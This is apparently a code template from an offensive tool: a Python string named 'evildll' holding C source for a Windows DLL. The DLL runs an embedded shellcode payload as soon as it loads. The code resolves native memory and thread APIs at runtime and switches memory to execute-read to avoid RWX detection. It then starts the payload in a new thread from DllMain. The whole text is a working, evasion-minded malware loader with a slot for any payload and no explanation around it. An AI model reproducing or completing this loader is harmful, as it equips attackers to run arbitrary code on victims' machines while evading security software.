evildll = """#include <windows.h>
#include <winternl.h>

#pragma comment (lib, "user32.lib")

unsigned char payload[] = "{{payload}}";
unsigned int payload_len = sizeof(payload);


typedef LPVOID (WINAPI *VirtualAlloc_t)(LPVOID, SIZE_T, DWORD, DWORD);
typedef BOOL (WINAPI *VirtualProtect_t)(LPVOID, SIZE_T, DWORD, PDWORD);
typedef NTSTATUS (NTAPI *NtAllocateVirtualMemory_t)(HANDLE, PVOID*, ULONG, PULONG, ULONG, ULONG);
typedef NTSTATUS (NTAPI *NtCreateThreadEx_t)(PHANDLE, ACCESS_MASK, PVOID, HANDLE, PVOID, PVOID, BOOL, ULONG, ULONG, ULONG, PVOID);

// Struct to hold dynamically resolved function pointers
typedef struct _API_TABLE {
    VirtualAlloc_t VirtualAlloc;
    VirtualProtect_t VirtualProtect;
    NtAllocateVirtualMemory_t NtAllocateVirtualMemory;
    NtCreateThreadEx_t NtCreateThreadEx;
} API_TABLE;

API_TABLE apiTable;

// Dynamically resolve required API functions
BOOL ResolveAPIs() {
    HMODULE hKernel32 = GetModuleHandleA("kernel32.dll");
    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");

    if (!hKernel32 || !hNtdll) return FALSE;

    apiTable.VirtualAlloc = (VirtualAlloc_t)GetProcAddress(hKernel32, "VirtualAlloc");
    apiTable.VirtualProtect = (VirtualProtect_t)GetProcAddress(hKernel32, "VirtualProtect");
    apiTable.NtAllocateVirtualMemory = (NtAllocateVirtualMemory_t)GetProcAddress(hNtdll, "NtAllocateVirtualMemory");
    apiTable.NtCreateThreadEx = (NtCreateThreadEx_t)GetProcAddress(hNtdll, "NtCreateThreadEx");

    return apiTable.VirtualAlloc && apiTable.VirtualProtect && apiTable.NtAllocateVirtualMemory && apiTable.NtCreateThreadEx;
}


DWORD WINAPI ExecutePayload(LPVOID lpParameter) {
    PVOID mem = NULL;
    SIZE_T regionSize = payload_len;
    HANDLE hThread;
    DWORD oldProtect;

    if (!ResolveAPIs()) return -1;

    
    NTSTATUS status = apiTable.NtAllocateVirtualMemory(
        GetCurrentProcess(),
        &mem,
        0,
        &regionSize,
        MEM_COMMIT | MEM_RESERVE,
        PAGE_READWRITE
    );

    if (status != 0 || !mem) return -2;

    // Copy into allocated memory
    memcpy(mem, payload, payload_len);

    // Change memory protection to PAGE_EXECUTE_READ (avoiding RWX)
    apiTable.VirtualProtect(mem, payload_len, PAGE_EXECUTE_READ, &oldProtect);

    
    status = apiTable.NtCreateThreadEx(
        &hThread,
        GENERIC_EXECUTE,
        NULL,
        GetCurrentProcess(),
        (LPTHREAD_START_ROUTINE)mem,
        NULL,
        FALSE,
        0,
        0,
        0,
        NULL
    );

    if (status != 0) return -3;

    CloseHandle(hThread);
    return 0;
}


BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
    HANDLE hThread;

    switch (ul_reason_for_call) {
        case DLL_PROCESS_ATTACH:
            DisableThreadLibraryCalls(hModule);
            hThread = CreateThread(NULL, 0, ExecutePayload, NULL, 0, NULL);
            if (hThread) CloseHandle(hThread);
            break;
        case DLL_PROCESS_DETACH:
        case DLL_THREAD_ATTACH:
        case DLL_THREAD_DETACH:
            break;
    }
    return TRUE;
}
"""
